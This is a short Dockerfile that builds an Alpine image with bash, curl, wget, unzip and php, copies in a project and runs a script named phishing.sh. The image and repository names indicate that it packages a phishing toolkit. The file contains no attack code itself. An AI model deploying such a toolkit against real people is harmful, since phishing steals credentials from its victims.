FROM alpine:latest
LABEL MAINTAINER="https://github.com/pythonyoutobe/phishing"
WORKDIR /phishing/
ADD . /phishing
RUN apk add --no-cache bash ncurses curl unzip wget php 
CMD "./phishing.sh"
